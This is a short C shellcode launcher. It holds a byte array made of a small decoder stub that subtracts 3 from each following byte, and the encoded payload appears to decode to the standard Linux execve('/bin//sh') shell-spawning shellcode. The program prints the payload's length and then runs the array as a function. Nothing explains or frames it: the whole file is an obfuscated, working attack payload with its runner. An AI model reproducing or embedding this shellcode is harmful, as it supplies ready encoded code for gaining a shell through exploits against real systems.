#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x1a\x5e\x8d\x3e\x31\xdb\x31\xc9\xb1\x15\x8a\x1f\xfe\xcb\xfe\xcb\xfe\xcb\x74\xfc\x88\x1f\x47\xe2\xf1\xeb\x05\xe8\xe1\xff\xff\xff\x34\xcc\xfa\xe4\x54\x6b\x32\x32\x76\x6b\x6b\x32\x65\x6c\x71\x8c\xe6\xb3\x0e\xd0\x83";


main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
